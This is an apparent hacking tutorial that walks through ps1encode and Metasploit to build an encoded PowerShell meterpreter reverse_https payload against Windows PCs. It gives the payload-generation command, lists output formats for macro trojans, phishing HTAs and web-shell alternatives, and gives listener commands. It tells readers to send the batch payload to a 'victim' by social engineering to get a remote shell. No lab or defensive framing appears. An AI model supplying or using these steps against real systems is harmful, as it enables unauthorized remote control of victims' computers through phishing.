Exploit Remote Windows PC using ps1encodeTool

Use to generate and encode a powershell based metasploit payloads.
 Available output types:
Open your kali Linux terminal and type the following command
https://github.com/CroweCybersecurity/ps1encode.git

./ps1encode.rb  -I 192.168.0.140 –p 4567 –a windows/meterpreter/reverse_https –t cmd
raw =>  base64 powershell code only without the run options
 cmd =>  default payload – use with bat files or for an easy copy + paste + shell job
 vba => for use with Microsoft Office products for macro trojans
 war => for use with Apache Tomcat
 exe => executable that will call out powershell and inject code into it. Requires MinGW to compile
 java => for use with java applet attacks (details on this and the setup instructions later)
 php =>  for use with PHP sites – an alternative to using web shells
 hta => HTML Applications –  good alternative to executables in phishing campaigns
 cfm => for use with Adobe ColdFusion. Similar to PHP, this is an alternative to using a web shell
Copy the highlighted text shown in below window and save in bat format and send it to the victim

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 192.168.0.140
exploit
Now send your batch files to victim using any social engineering technique. Now when the victim will use exe you will get the meterpreter of victim PC.
